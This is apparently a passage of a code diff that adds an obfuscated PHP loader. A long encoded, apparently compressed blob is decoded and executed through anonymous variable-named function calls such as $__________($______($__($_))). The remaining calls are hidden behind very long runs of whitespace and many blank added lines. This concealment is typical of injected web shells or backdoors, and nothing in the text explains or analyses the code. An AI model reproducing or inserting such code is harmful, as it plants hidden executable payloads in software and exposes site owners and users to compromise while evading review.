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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
